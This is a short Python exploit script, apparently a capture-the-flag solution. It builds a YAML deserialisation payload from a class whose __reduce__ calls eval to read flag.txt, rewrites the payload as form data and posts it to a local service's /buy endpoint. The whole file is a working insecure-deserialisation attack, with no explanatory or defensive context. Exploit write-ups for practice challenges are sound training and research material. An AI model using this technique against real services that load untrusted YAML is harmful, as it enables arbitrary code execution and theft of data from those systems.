import requests
import yaml


class Payload(object):
    def __reduce__(self):
        return (eval, ("{'yam': 1, 'flag': open('flag.txt').read()}",))


data = yaml.dump(Payload())
print(data)
data = data.replace("\n", "&").replace(": ", "=")
print(data)

r = requests.post("http://127.0.0.1:50000/buy", data=data, allow_redirects=False)

print("\n", r.content)
